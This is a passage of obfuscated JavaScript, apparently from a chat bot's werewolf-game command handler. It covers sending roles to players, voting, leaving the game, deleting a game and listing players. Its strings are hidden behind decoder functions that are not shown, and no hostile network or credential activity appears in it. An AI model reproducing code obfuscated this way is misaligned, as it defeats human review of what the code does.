text=_0x9b1ba0(0x196,0x8,0x153,0x75,0x19a)+conn[_0x480ff3(-0x30f,-0x3f1,-0x2e4,-0x24c,-0x92)+'me'](ww[from][_0x9b1ba0(0xd3,0x66,0x21a,-0xb4,0xd1)+'r'][i]['id'])+(_0x28040b(-0x17,0x9,-0x168,-0xc6,0x141)+_0x526c7c(0x1e5,0x280,0x20f,0x319,0x320)+_0x526c7c(0x467,0x271,0x16b,0x364,0x1a7)+_0x526c7c(0x34c,0x32f,0x1c4,0x1dc,0x342)+_0x2fe230(-0x390,-0x19f,-0x13a,-0x1a6,-0x6f)+_0x526c7c(0x2a2,0x297,0x44d,0xf0,0x331)+_0x2fe230(0xa9,-0x108,-0xc0,0xf4,-0x1d2)+_0x9b1ba0(0x15c,-0x53,0x2e9,-0x42,0x3)+_0x28040b(-0x63,0x16b,0xb9,-0x1a7,0xde)+_0x9b1ba0(0x17a,0x2f8,0x164,-0x4e,0xe2))+emoji_role(_0x28040b(0x180,0x348,0x121,0x56,-0x2))+(_0x9b1ba0(-0x1b,-0x143,0xfe,0x8a,-0x14a)+_0x28040b(0x1fd,0x20c,0x2d2,0x3c4,0xc6)+_0x526c7c(0x30b,0x22a,0x1d5,0x405,0x3d3)+_0x526c7c(0x4d1,0x3c0,0x204,0x47d,0x21c)+_0x526c7c(-0x8f,0x172,0x2cb,0x34b,0x165)+_0x28040b(-0x125,-0x4f,-0x135,-0x254,-0x132)+_0x2fe230(-0x20,-0x1a0,-0x60,-0x170,-0xd0)+_0x480ff3(-0x326,-0x2e7,-0x282,-0x1b2,-0x35a)+_0x28040b(0x132,-0x3c,-0xd0,0x136,0xda)+_0x9b1ba0(0x74,0xb1,-0x10b,0x107,0x225)+_0x480ff3(-0xd3,-0x118,-0x39b,-0x1c5,-0x19c)+_0x28040b(0x126,0x259,0xc,0x117,0x220)+_0x526c7c(0x269,0x18c,-0x1e,0x10d,0x136)+_0x28040b(0x1c6,0xc6,0x3bd,0x22,0xd9)+_0x480ff3(-0x195,-0xa4,-0x455,-0x2a4,-0x19a)+_0x2fe230(0xc6,-0xf0,-0x1c1,0xcf,0x52)+_0x28040b(-0xc5,0x3b,-0x10d,-0x110,-0x18d)+_0x480ff3(-0x4,0x44,0x0,0x27,-0x1d3)+_0x28040b(0xfa,-0x84,-0xd8,0x193,0x3b))+list1+(_0x28040b(0xaa,0x4c,-0x13d,0x27e,0x1d9)+_0x2fe230(-0xb0,-0x65,0x18,-0x63,-0x3d)+_0x9b1ba0(-0x1b9,-0x356,-0xce,-0x62,-0x64)+_0x28040b(0x92,0x27a,0x5b,-0x6e,-0xd8)+_0x526c7c(0x3c7,0x47e,0x48a,0x43e,0x674)+_0x9b1ba0(0x10a,0x23d,0xa1,0x20,0x2f9)+_0x526c7c(0x226,0x206,0x3a2,0x278,0x32b)+_0x480ff3(-0xd1,-0x2f4,-0x247,-0x1d1,-0x141)+_0x9b1ba0(0x52,-0x87,0x91,0xf8,0x215)+_0x9b1ba0(0x46,-0xcc,-0x5f,-0x165,0x152)+_0x526c7c(0x3fe,0x26e,0x158,0xb7,0x351));const _0x12c7ea={};_0x12c7ea[_0x28040b(-0xf4,-0x2ee,0x3d,0xdf,-0x1f1)]=text,_0x12c7ea[_0x9b1ba0(-0x94,0x2,0x9,-0x249,0x156)+_0x526c7c(0x58,0x10a,0x27e,0x1c2,0x38)]=player,await conn[_0x480ff3(0x90,0xd4,0x92,0x86,0x1db)+_0x28040b(-0xc1,-0x1ef,0xae,-0x1b3,0x42)+'e'](ww[from][_0x28040b(0x134,0x2e9,0x2ad,0x6f,0xd1)+'r'][i]['id'],_0x12c7ea);}}else{if(ww[from][_0x28040b(0x134,0x189,0x3e,-0x9,0x2e6)+'r'][i][_0x480ff3(0x95,0x13,-0x277,-0x147,-0x1d3)]===_0x28040b(0x1ac,0xf,0x86,0x142,0x152)+_0x2fe230(0xae,-0x12e,-0x3f,-0x1d4,-0x2a4)){if(ww[from][_0x480ff3(0x115,-0x5b,-0x4a,0x5c,0xfc)+'r'][i][_0x526c7c(0xbc,0x14a,0xdf,-0xb2,0x5b)+'d']!=!![]){let text=_0x28040b(0x1f7,0x3b9,0x34d,0xe5,0x1b6)+conn[_0x2fe230(-0xd6,-0x128,0x4a,-0x16b,-0x30d)+'me'](ww[from][_0x28040b(0x134,0x21,0xed,-0x87,0x47)+'r'][i]['id'])+(_0x526c7c(0x44e,0x2d3,0x42b,0x26c,0x135)+_0x28040b(0x58,-0xe6,0x164,-0xba,-0xfa)+_0x9b1ba0(-0x30,-0x3,-0x8f,-0x102,0x14a)+_0x480ff3(-0x10c,-0x80,0x16e,-0x2c,-0x11b)+_0x28040b(0x131,0x18b,0x310,0x126,-0x4d)+_0x28040b(0x1a5,0xd8,0x1a7,0x2ed,0x371)+_0x480ff3(0x49,-0x3c,-0x178,-0x18c,-0x26c)+_0x2fe230(0x9c,-0x77,0xb4,0x156,-0x2d)+_0x2fe230(-0x22e,-0x190,-0x94,0x47,-0x382)+_0x28040b(-0xde,-0x181,-0xa6,-0x6,-0x67)+_0x9b1ba0(0x17a,0x18a,0x280,0x6a,0x1f5))+emoji_role(_0x480ff3(-0x70,-0x54,0x185,0xd4,0x237)+_0x526c7c(0x1ef,0x170,0x322,0x1db,0x5c))+(_0x28040b(0x20a,0x27c,0x328,0x19,0x373)+_0x526c7c(0x42c,0x44b,0x63a,0x289,0x3ea)+_0x28040b(-0x59,0x41,-0x238,-0x6f,0x58)+_0x526c7c(-0x53,0x1a9,0x127,-0x1c,0x385)+_0x9b1ba0(0x8c,-0xae,0x10,-0xe5,0x23f)+_0x28040b(0x178,0x2cb,-0x61,0x200,-0x4b)+_0x28040b(-0xb0,-0x6d,-0xc,0x135,-0x117)+_0x28040b(0x9e,0x239,-0x102,0x28b,-0x58)+_0x28040b(-0xcb,0x7b,-0x19,-0x217,-0x24e)+_0x2fe230(-0x19b,-0x9,-0xca,0x1e5,-0xba)+_0x28040b(-0x5c,0x2,-0x4c,-0x31,0x51)+_0x480ff3(0x165,0x32,0xe5,0x51,0x103)+_0x526c7c(0x3a9,0x34f,0x351,0x41c,0x266)+_0x480ff3(-0x194,-0x2e9,-0x1e0,-0x2ac,-0x117)+_0x480ff3(-0xdf,-0x180,-0x19b,-0x213,-0x3f2)+_0x480ff3(-0x15c,-0x45b,-0x2e3,-0x296,-0x2cf)+_0x9b1ba0(0x88,-0xcb,0x22f,0x237,0xa8)+_0x9b1ba0(0x16d,0x1cb,0x16a,-0xd,0x9f)+_0x2fe230(0x184,0x183,0x68,0xac,0x326)+_0x28040b(0x1,-0x6a,0x19c,0x10c,0xcc)+_0x28040b(0x1b1,0xc9,0x42,0x19c,0x1d2)+_0x526c7c(0x216,0x249,0x18c,0x260,0x140)+_0x9b1ba0(-0x1d9,-0x160,-0x2b3,-0x2d9,-0x2d9)+_0x2fe230(0x20,0x140,-0x78,0x29,0x95)+_0x526c7c(0x123,0x1c8,0x2c7,0x211,0x1a5)+_0x28040b(0xec,0x240,0x220,-0x6c,0x164)+_0x526c7c(0x385,0x41e,0x583,0x5da,0x3be)+_0x526c7c(0x456,0x376,0x1b3,0x45a,0x1f3))+list1+(_0x480ff3(-0x80,0x1d,-0x22b,-0x2e,0x47)+_0x9b1ba0(-0x112,-0x196,-0x17f,-0x284,0x71)+_0x2fe230(-0x156,-0x10c,-0x1b6,-0x240,-0x10c)+_0x526c7c(0x255,0x3b2,0x3df,0x26b,0x272)+_0x480ff3(-0x113,-0x26c,0x89,-0x94,-0x248)+_0x480ff3(-0x396,-0x3e6,-0x40d,-0x2c3,-0x463)+_0x480ff3(-0x271,-0x1,-0x1d9,-0x1e6,-0x2eb)+_0x2fe230(-0x6b,-0x92,0x10b,-0x25f,-0x19c)+_0x480ff3(0x18a,0x25c,-0x63,0x116,0xa9)+_0x526c7c(-0x1f,0x165,-0x87,-0x4c,0x180));const _0x72646f={};_0x72646f[_0x9b1ba0(-0x155,-0x78,-0x19d,-0xb,-0x23a)]=text,_0x72646f[_0x2fe230(0x110,0x19,-0x1a5,-0x1be,0xdf)+_0x480ff3(-0xc2,-0x2bd,-0xfa,-0x2b8,-0x28b)]=player,await conn[_0x28040b(0x15e,0x293,0x2ac,0x1fa,0x178)+_0x28040b(-0xc1,0xbb,0xb5,-0x1a6,-0x283)+'e'](ww[from][_0x480ff3(0x22,0xec,-0xb3,0x5c,0x142)+'r'][i]['id'],_0x72646f);}}else{if(ww[from][_0x480ff3(-0x5e,-0x129,0x25c,0x5c,-0xc0)+'r'][i][_0x9b1ba0(-0xd0,-0x2b2,-0x1bc,-0x13f,-0x140)]===_0x9b1ba0(0xb0,-0x111,0x296,-0x11,0xf0)+_0x480ff3(0x268,0xb8,0xe4,0xfd,0x216)){if(ww[from][_0x2fe230(0x1f2,0x180,0x14c,0x227,0x16f)+'r'][i][_0x480ff3(-0x32a,-0x441,-0x1fb,-0x278,-0x3f5)+'d']!=!![]){let text=_0x2fe230(0x354,0x243,0x3ac,0x285,0x1c4)+conn[_0x526c7c(0x263,0x176,0x1e7,-0x8a,0xba)+'me'](ww[from][_0x9b1ba0(0xd3,0x15b,0x10d,0x2c5,-0x62)+'r'][i]['id'])+(_0x526c7c(0x319,0x2d3,0x20c,0x2ce,0x307)+_0x2fe230(0x21e,0xa4,0x58,0x52,-0x4b)+_0x28040b(0x31,-0x30,0x12c,-0xa1,0x1de)+_0x480ff3(-0xbd,0xbf,-0x6b,0x17,-0x85)+_0x526c7c(0x4d1,0x4ae,0x482,0x4cd,0x30d)+_0x28040b(0xc6,0x20d,-0x5c,0x290,0x158)+'r\x20')+emoji_role(_0x526c7c(0x48d,0x3fb,0x2ac,0x5bc,0x219)+_0x480ff3(0x24e,0x13b,0x148,0xfd,0xe9))+(_0x480ff3(-0x67,0x132,0x1a8,0x132,-0xcd)+_0x2fe230(0x338,0x1ad,0x224,0x15a,0x213)+_0x526c7c(0x432,0x4e5,0x353,0x591,0x48d)+_0x480ff3(-0xe0,-0x2c1,-0x39f,-0x2b0,-0x4ab)+_0x2fe230(0xf2,-0xb9,-0x16,0xd6,-0x24d)+_0x480ff3(-0xd5,-0x383,-0x1a8,-0x1db,-0x69)+_0x2fe230(-0x25a,-0x6a,-0xec,0xfd,-0x11c)+_0x2fe230(0x2c5,0xea,-0x5c,0x239,0x298)+_0x480ff3(-0x39b,-0x1a8,-0x1cf,-0x1a3,-0x103)+_0x28040b(0xcb,0x27f,0x14b,0xc3,0x7e)+_0x526c7c(0x235,0x24f,0x7e,0x356,0x258)+_0x9b1ba0(0xc7,-0x12e,0xcd,-0x8a,0x261)+_0x526c7c(0x2aa,0x345,0x422,0x4df,0x50d)+_0x9b1ba0(-0x16e,-0x53,-0x80,-0x278,-0x101)+_0x526c7c(0x209,0x3e9,0x411,0x502,0x43b)+_0x28040b(0x153,0x5e,0x15c,0x32b,-0x14)+_0x28040b(0x139,0x2ab,0x204,0x2f1,-0x72)+_0x28040b(0x45,0x160,0xb2,-0x14a,0x10e)+_0x9b1ba0(-0x17e,0x4,-0x14b,-0x362,-0x1b4)+_0x2fe230(-0xc1,0xe8,0x59,-0x48,-0xde)+_0x28040b(0x1b1,0x38b,0x253,0x1bf,0x1a3)+_0x2fe230(0x3,-0x55,-0x67,-0x1c0,0xe1)+_0x28040b(-0x178,-0x32d,-0x1e7,-0xc0,0x3)+_0x480ff3(-0x222,-0x227,-0x45c,-0x2b9,-0x429)+_0x2fe230(-0x73,0xd4,-0x29,0x1a5,0x144)+_0x28040b(0x6a,0x1b5,0x10c,0x130,0x17b)+_0x2fe230(-0x2f2,-0x144,-0x32b,-0xd1,-0x28b)+_0x2fe230(-0x59,-0x79,0xa2,0x149,0xc8)+_0x9b1ba0(0x9e,0x12f,-0x13e,0x121,0x2c)+_0x28040b(0xfa,0x12c,0xf3,-0xdc,-0x41))+list2+(_0x526c7c(0x3ca,0x394,0x1f1,0x417,0x3f8)+_0x28040b(-0xb1,0xd,-0x1da,-0xf0,-0x173)+_0x28040b(-0xe8,-0x256,-0x275,-0x51,-0x209)+_0x28040b(-0x66,-0x199,-0x9c,0xe4,-0x4c)+_0x480ff3(-0x26f,-0x31e,-0x27a,-0x228,-0x97)+_0x28040b(0x146,-0x31,0x2a5,0x1e3,0x1d3)+_0x28040b(0xac,0x200,0x2a1,0x16,-0x27)+_0x526c7c(0xd8,0x295,0x2d5,0xdc,0x22c)+_0x28040b(-0x19a,0x16,-0x161,-0x36d,-0x11b)+_0x480ff3(-0x25e,-0x2f,-0x1d7,-0x110,-0xc0)+_0x480ff3(-0xd4,0x107,-0x17f,0x27,0x66));const _0x226c5b={};_0x226c5b[_0x2fe230(-0x1bb,-0xa8,0x109,-0xe7,-0x6)]=text,_0x226c5b[_0x9b1ba0(-0x94,-0x20b,0x38,0x12e,-0x211)+_0x2fe230(-0x37c,-0x194,-0x37a,-0x197,-0xb7)]=player,await conn[_0x480ff3(-0x50,0xb0,0xd5,0x86,0x285)+_0x480ff3(-0x11c,-0xc7,-0x354,-0x199,0x1f)+'e'](ww[from][_0x480ff3(0x84,0x1b,-0xec,0x5c,-0x13e)+'r'][i]['id'],_0x226c5b);}}}}}}}await reply(_0x28040b(0x187,0x18d,0x1e9,0x1a4,0x2af)+_0x526c7c(0x3d2,0x2b3,0x102,0x4a2,0xce)+_0x9b1ba0(-0x1a,0x1d8,0x15d,-0x131,-0x1a9)+_0x2fe230(0x235,0x239,0x404,0x208,0x287)+_0x480ff3(-0x55,0x1a3,0x24,0x6f,0x66)+_0x28040b(-0x6a,0x76,-0xd6,-0x260,-0xd2)+_0x526c7c(0xef,0x285,0x3e9,0x470,0x20a)+_0x480ff3(0x181,-0x173,-0xa5,-0x7,-0x139)+_0x526c7c(0x3ae,0x381,0x401,0x21c,0x4eb)+_0x480ff3(-0x270,-0x1db,-0x1df,-0x264,-0x367)+_0x9b1ba0(0x3c,-0x109,0x1e5,-0x1,0x1f9)+_0x480ff3(-0x23d,-0x21d,-0xfe,-0x6d,0x2d)+_0x28040b(-0x67,-0x1a7,0x8d,0xc1,-0xd)+_0x480ff3(-0x1ed,-0x1dd,-0x271,-0x235,-0x11b)+_0x9b1ba0(-0xaf,-0xe5,-0x19d,0x17,0x72)+_0x28040b(-0x107,-0x2f9,-0x66,-0x29b,-0x1bf)+_0x28040b(0x10,-0xbb,0x35,0x145,0x16f)+_0x9b1ba0(0x3f,-0x51,0x1d6,0x4,0x23b)+_0x2fe230(0x14c,0x16,0x5b,0x18c,-0x1a0)+_0x480ff3(0x178,0x128,0x161,0x6d,0x105)+_0x480ff3(0xde,-0x7c,0x22a,0x133,-0x76)+_0x480ff3(0x1f,-0x229,0x101,-0x83,0x41)+_0x2fe230(0x292,0x1b8,-0x6,0x2fa,-0x15)+_0x2fe230(0x155,0x1cf,0x73,0x190,0xad)+_0x2fe230(-0x73,-0x17e,-0x10,-0x8f,-0x369)+_0x526c7c(0x365,0x1b6,0xf4,0x3a7,0x76)+_0x9b1ba0(-0x194,-0x1d1,0x6a,-0x229,-0x1b)+_0x28040b(0x40,0x85,-0xa1,0x6c,-0x114)+_0x480ff3(0xa8,-0xe0,-0xc7,0xef,0xa7)+_0x28040b(0x10c,0x71,0x3f,0xed,0x2b8)+_0x28040b(0x8,0x71,-0xd6,0x81,0x14a)+_0x526c7c(0x5da,0x41d,0x353,0x5c8,0x487)+_0x2fe230(-0xc3,-0x58,0x114,-0x13b,-0x7d)+_0x526c7c(0x292,0x34f,0x243,0x503,0x3de)+_0x526c7c(0x3c2,0x30b,0x4af,0x2f3,0x4ef)+_0x526c7c(0xb2,0x1e1,0x231,0x278,0x396)+_0x526c7c(0x34e,0x3d1,0x2bc,0x344,0x517)+_0x9b1ba0(-0x4f,-0xe3,-0x199,0x96,-0x240)+_0x9b1ba0(-0x229,-0x291,-0x41b,-0x26e,-0x24d)+_0x9b1ba0(-0x1f0,-0x186,-0x362,-0xc7,-0x2b3)+_0x480ff3(-0x83,0x221,0x268,0xf6,0x5b)+_0x28040b(-0x47,0x7,-0x11,0xe2,0xa)+_0x480ff3(-0x317,-0x385,-0x314,-0x192,-0x356)+_0x480ff3(-0x164,0x16,0x1bb,0x49,-0x130)+'u'),await run(conn,from,ww);}else{if(value===_0x28040b(0x12e,0x22a,0x2ae,0xd8,0x1de)){if(!ww[from])return reply(_0x28040b(0x19e,-0x2,0x58,0x127,0x1a7)+_0x526c7c(0x10f,0x110,0x25f,0x2ce,0x2fa)+_0x9b1ba0(0x42,0x143,0x203,0x221,0x1e0)+_0x526c7c(0x414,0x4cf,0x302,0x527,0x5a4)+_0x28040b(0x90,-0x1b,0x194,0x8e,0x10c));if(ww[from][_0x480ff3(-0x16c,-0x65,0x140,-0xae,-0x1f2)+'s']===![])return reply(_0x9b1ba0(0x5a,0x174,0x16b,-0x112,0x16a)+_0x28040b(0x1e5,0xbb,0x3c6,0x104,0xe)+_0x9b1ba0(0x8,0xc8,-0x67,-0xcf,0x1a5)+_0x480ff3(-0x1f2,-0x252,-0x56,-0x17b,-0x88)+_0x480ff3(-0xee,0x8c,-0x1f3,-0xee,-0x229)+_0x2fe230(-0x135,-0x191,-0x1d5,-0x11c,-0x2d5));if(ww[from][_0x526c7c(0x3b0,0x216,0x1c3,0x39c,0x387)]!==_0x9b1ba0(-0xe0,-0x260,0x10a,0x3b,-0x203)+'g')return reply(_0x2fe230(0x1f2,0x107,-0x48,0x9f,-0xf4)+_0x480ff3(-0x33a,-0x5c,0x85,-0x157,-0x2c7)+_0x9b1ba0(-0x18e,-0x218,-0x160,-0x374,-0x307)+_0x9b1ba0(-0x1ac,-0xf,-0x27,-0x26,-0x15e)+_0x526c7c(0x3c3,0x34d,0x3c2,0x4f7,0x185));if(playerOnRoom(sender,from,ww)===![])return reply(_0x9b1ba0(0x76,-0x7d,0x5b,0x16d,-0x3d)+_0x28040b(0x117,0x2dd,0x238,-0x73,-0x58)+_0x480ff3(-0x380,-0x27f,-0x170,-0x264,-0x442)+'er');if(dataPlayer(sender,ww)[_0x526c7c(0x10a,0x14a,0x19,0x65,0xdc)+'d']===!![])return reply(_0x28040b(0xd7,-0xf5,0x120,0x166,0x1c3)+_0x526c7c(0x1e2,0x2d2,0x405,0x1a0,0x2e6)+_0x526c7c(-0x5d,0x1a4,0xd7,0x39b,0x2f0));if(!target||target[_0x480ff3(-0x296,-0x22a,0x12,-0xd1,-0x2cf)+'h']<0xb05*-0x1+0xef1+-0x3eb||target[_0x480ff3(-0x1,-0x27f,-0x198,-0x1a5,-0x15a)]('')[_0x526c7c(0x234,0x2f1,0x3d5,0x179,0x15a)+'h']>-0x1afa+-0x33*0x89+-0x1*-0x3647)return reply(_0x28040b(0x13d,0xab,0x2e3,0x29d,0x24c)+_0x526c7c(0x3b4,0x4e2,0x606,0x34d,0x433)+_0x28040b(0x17c,0x277,0x309,0x25a,0xa)+_0x28040b(0xff,0x2ff,0x5f,0x10c,0x2e4));if(isNaN(target))return reply(_0x2fe230(0x154,0x10,0x16d,0x100,0xd6)+_0x480ff3(-0x8e,-0x140,-0x19e,0x53,0x24b)+_0x480ff3(0x5a,0x7f,0x118,0x95,-0x8e)+_0x480ff3(0x232,0x175,-0x117,0x67,0x18e));if(dataPlayer(sender,ww)[_0x9b1ba0(-0x109,0x24,-0x109,-0x17,-0x80)+'e']===!![])return reply(_0x526c7c(0x1c0,0x3c1,0x207,0x3e0,0x361)+_0x526c7c(0x35f,0x2d2,0x37c,0x2d8,0x31e)+_0x9b1ba0(0x2d,0x4d,-0x138,-0x162,-0x144)+_0x9b1ba0(0x135,0x329,0x9,0x1ad,-0x97)+_0x2fe230(0x64,-0xce,-0x292,-0xe7,-0x7d)+'ng');let byId=getPlayerById2(sender,parseInt(target),ww);if(byId['db'][_0x480ff3(-0x36d,-0x188,-0x2a9,-0x278,-0xc0)+'d']===!![])return reply(_0x2fe230(0x35b,0x171,0xf8,0x2cb,0x2ce)+_0x480ff3(0x154,-0x30,-0x88,-0x11,-0xbe)+_0x526c7c(0x41f,0x329,0x1b1,0x2fb,0x15d)+'ti');if(ww[from][_0x480ff3(-0xb0,0x194,0x133,0x5c,0x17d)+'r'][_0x28040b(0x7,-0xaa,0x4f,-0x19,-0xac)+'h']<parseInt(target))return reply(_0x28040b(-0x1af,-0x1f9,-0x1a7,-0x2a9,-0x141)+'id');if(getPlayerById(from,sender,parseInt(target),ww)===![])return reply(_0x526c7c(0x465,0x40f,0x24a,0x41e,0x4f6)+_0x2fe230(0x3ad,0x20f,0x30a,0x304,0x207)+_0x9b1ba0(-0x205,-0xff,-0x67,-0x28a,-0x37a)+_0x9b1ba0(-0x176,-0x27f,-0x223,-0x1f2,-0x1f1)+_0x480ff3(-0xc4,0xca,-0x129,-0xff,0x2e));return vote(from,parseInt(target),sender,ww),reply(_0x9b1ba0(-0x15e,-0x50,-0x2be,-0x203,-0xa5)+'e');}else{if(value==_0x480ff3(0x8b,-0x1a8,0xf1,-0x9,0x123)){const ooVEpk=(_0x9b1ba0(0x44,0x1ca,0x8d,-0xbf,0x1da)+_0x9b1ba0(0xb7,-0x1f,-0x5d,0x11f,-0x107))[_0x526c7c(0x238,0x21d,0x138,0x1ff,0x299)]('|');let pFrwsX=-0x1*-0x5b3+0xdf6+0x7*-0x2cf;while(!![]){switch(ooVEpk[pFrwsX++]){case'0':playerExit(from,sender,ww);continue;case'1':if(!ww[from])return reply(_0x480ff3(-0x44,-0xc2,0x140,0x12b,0x6f)+_0x28040b(-0x1da,-0x309,-0x195,-0x2f0,-0x189)+_0x526c7c(0x495,0x38d,0x448,0x4a3,0x1ab)+_0x526c7c(0x4a1,0x4cf,0x57b,0x632,0x43e)+_0x9b1ba0(0x2f,-0xb0,-0x66,-0x73,-0x17));continue;case'2':reply('@'+sender[_0x480ff3(-0xd0,-0x1a9,0xe,-0x1a5,-0x1ab)]`@`[0x26ba+-0x9*0x254+-0x11c6]+(_0x28040b(0x110,0x247,0x1e6,0xde,-0x61)+_0x28040b(0x39,0x3f,0x1d2,-0x22,0x1b4)+_0x480ff3(-0x2e,-0x2ce,-0xac,-0xdd,0x9)+_0x480ff3(-0x6f,-0x325,-0x308,-0x207,-0xd4)+'an'));continue;case'3':if(ww[from][_0x28040b(0x2a,-0x40,-0xbf,-0x148,0xf9)+'s']===!![])return reply(_0x480ff3(-0x141,-0x10b,-0x27a,-0xbf,-0x3b)+_0x2fe230(-0x114,0xb5,0x7d,0x73,0x10c)+_0x2fe230(0x5e,0x34,-0x11,0x50,0x1ba)+_0x28040b(-0x16,-0x109,0x11e,-0x135,-0x12)+_0x526c7c(0x8b,0x21a,0x3ce,0x3bb,0xd8)+_0x28040b(-0x178,-0x18c,-0x221,-0x8b,-0x23a)+_0x526c7c(0x391,0x20f,0x12b,0x2c3,0x401)+_0x480ff3(-0x3a2,-0x378,-0x9f,-0x1a3,-0x74)+_0x480ff3(-0x97,-0xe9,0x160,0x20,-0x1c0)+'ar');continue;case'4':if(playerOnRoom(sender,from,ww)===![])return reply(_0x9b1ba0(0x76,-0xec,-0x8f,-0xc1,0x1bf)+_0x2fe230(0x102,-0x8f,-0x1bf,-0x9e,-0xc7)+_0x28040b(0x1eb,0xe0,0x1ff,0x21d,0x20d)+_0x9b1ba0(-0x12d,-0x1fe,-0x234,-0x1e7,0xbc)+_0x2fe230(0x29d,0x1a1,0x281,0x282,0x9c)+_0x480ff3(-0xd3,0x165,0x142,0x0,0x1ea)+'n');continue;}break;}}else{if(value===_0x28040b(0xe3,0x1ad,0x76,0x52,0x2c4)+'e'){if(!ww[from])return reply(_0x28040b(0x203,0x202,0x1c,0x26f,0x1b9)+_0x2fe230(-0x1ed,-0x18e,-0x9c,0x17,-0x210)+_0x526c7c(0x484,0x38d,0x4c5,0x49b,0x277)+_0x28040b(0x1e5,0x78,0x95,0x128,0x3ae)+_0x480ff3(-0x1b0,-0x59,0x59,-0x48,-0x8d));if(ww[from][_0x480ff3(0x15e,0x145,-0x248,-0x49,0x96)]!==sender)return reply(_0x28040b(-0x7,-0x206,0x112,-0xd8,0x1be)+'\x20@'+ww[from][_0x9b1ba0(0x2e,0x2c,-0x183,-0x19e,-0xe9)][_0x28040b(-0xcd,0x7c,-0xd6,0xed,-0x91)]('@')[0xd05+0x5*0x113+-0x1264]+(_0x526c7c(0x24e,0x399,0x3f6,0x4fd,0x2a1)+_0x480ff3(-0xf,-0x27d,0x37,-0x197,-0x12f)+_0x2fe230(0xc7,0x56,-0x5e,0x88,-0x96)+_0x480ff3(-0x31,-0x18,-0x293,-0x1b5,-0x20b)+_0x526c7c(0x35a,0x301,0x24c,0x195,0x101)+_0x526c7c(0x591,0x43f,0x35c,0x3f8,0x305)+_0x526c7c(0x240,0x3c2,0x4d1,0x306,0x427)+_0x9b1ba0(0x131,0x31c,0x198,0x1ee,0x222)));reply(_0x28040b(0xbb,0x186,0x13b,-0xa4,0xa8)+_0x2fe230(0x1b3,0x231,0x358,0x361,0x2f8)+_0x480ff3(0x13,-0x1b5,0x19,-0x6f,-0x244)+_0x480ff3(0x14,0x1a4,0x32,0x92,0x25a)+_0x526c7c(0x253,0x442,0x3c4,0x401,0x411)+_0x28040b(-0x163,-0x68,0x54,-0x28a,0x82)+'s')[_0x9b1ba0(-0x100,-0x223,-0x107,-0x277,-0x174)](()=>{delete ww[from];});}else{if(value===_0x2fe230(0x1d2,0x180,0x1b9,-0x77,0x363)+'r'){if(!ww[from])return reply(_0x9b1ba0(0x1a2,0x99,-0x59,0x12e,0x1bf)+_0x28040b(-0x1da,-0x2de,-0x32c,-0x259,-0x13e)+_0x9b1ba0(0x42,0x4d,0xd8,-0x178,-0x16d)+_0x2fe230(0x90,0x231,0x1d7,0x178,0xf7)+_0x480ff3(-0x2e,0xcf,0xb2,-0x48,0x1a1));if(playerOnRoom(sender,from,ww)===![])return reply(_0x28040b(0xd7,-0x47,0x23b,0xc,0xd3)+_0x480ff3(-0x14a,-0xd,-0xd5,-0x1b3,0x5)+_0x526c7c(0x412,0x4d5,0x676,0x4cf,0x33b)+_0x526c7c(0x264,0x21e,0x33f,0x83,0x212)+_0x28040b(0x155,-0xa7,0x303,-0xa9,0x1d3)+_0x2fe230(-0xaf,0x124,0xd5,0xf0,-0xb6)+'n');if(ww[from][_0x2fe230(0x1e,0x180,0x10a,0x1e6,0x159)+'r'][_0x526c7c(0x217,0x2f1,0x15a,0x394,0x436)+'h']===0x3*0xc22+-0x5db*0x2+-0x18b0)return reply(_0x2fe230(0x1d5,0x107,0x21c,0x262,0x29b)+_0x9b1ba0(0x184,0x2b6,0x55,0x2ef,0x1c4)+_0x480ff3(-0xe,0xcb,-0x246,-0x6f,-0x14b)+_0x480ff3(-0x1c8,0x2c,-0x30e,-0x17b,-0x371)+_0x2fe230(0x179,0x1fe,0x322,0x20a,0x3d4)+_0x480ff3(-0x16a,-0x230,0x109,-0x44,0x15e)+_0x2fe230(-0x3e,0x180,0x2c4,0xf3,0x2c3)+'r');let player=[],text=_0x526c7c(0x57e,0x471,0x409,0x307,0x418)+_0x9b1ba0(-0x98,-0x1d4,-0x15,-0x23a,-0x1cc)+_0x480ff3(-0x152,0xf5,-0x170,-0x91,0x7a)+_0x9b1ba0(0x18c,0x16a,0xb6,-0x5f,0x362)+_0x9b1ba0(-0x12f,-0x2e4,-0x10f,-0x248,-0x176)+_0x480ff3(-0xd2,-0x97,-0x131,-0x107,0xa2)+_0x480ff3(0xeb,0x10f,-0x1f4,-0xcf,0x4f)+'*\x0a';for(let i=0x1951+-0xe85+-0x4*0x2b3;i<ww[from][_0x480ff3(0x16b,0x15f,0x2c,0x5c,0x113)+'r'][_0x2fe230(0x1e3,0x53,0xbe,0x82,0x1d)+'h'];i++){text+='('+ww[from][_0x28040b(0x134,0x22e,0x175,0x2b,0x111)+'r'][i][_0x480ff3(-0x226,-0xef,-0x1ea,-0xbd,0x10)+'r']+_0x526c7c(0x4f8,0x4c6,0x34d,0x67e,0x48d)+ww[from][_0x526c7c(0x3b9,0x41e,0x47f,0x2f0,0x4f1)+'r'][i]['id'][_0x2fe230(0x25,-0x29,-0x4a,-0x1d8,0xd)+'ce'](_0x2fe230(-0x1ae,0x3c,-0x6b,-0xae,-0xaa)+_0x28040b(-0x153,-0x2c0,0x75,-0x2af,-0x5e)+_0x480ff3(0xb3,0xfb,0xc5,-0xba,0x80),'')+'\x20'+(ww[from][_0x28040b(0x134,-0x8c,0x20,0x160,0x26c)+'r'][i][_0x526c7c(0x321,0x14a,0x10a,0x58,0x1e8)+'d']===!![]?_0x480ff3(-0x178,-0xf1,-0x2e9,-0x27b,-0x44d)+ww[from][_0x480ff3(-0xec,-0x4c,0xb3,0x5c,0x1f8)+'r'][i][_0x526c7c(0x19d,0x27b,0x1a9,0xc6,0x11f)]:'')+'\x0a',player[_0x526c7c(0x4f7,0x434,0x616,0x62b,0x35a)](ww[from][_0x28040b(0x134,0x323,0x258,-0x43,0x1f3)+'r'][i]['id']);}reply(text);}else{let 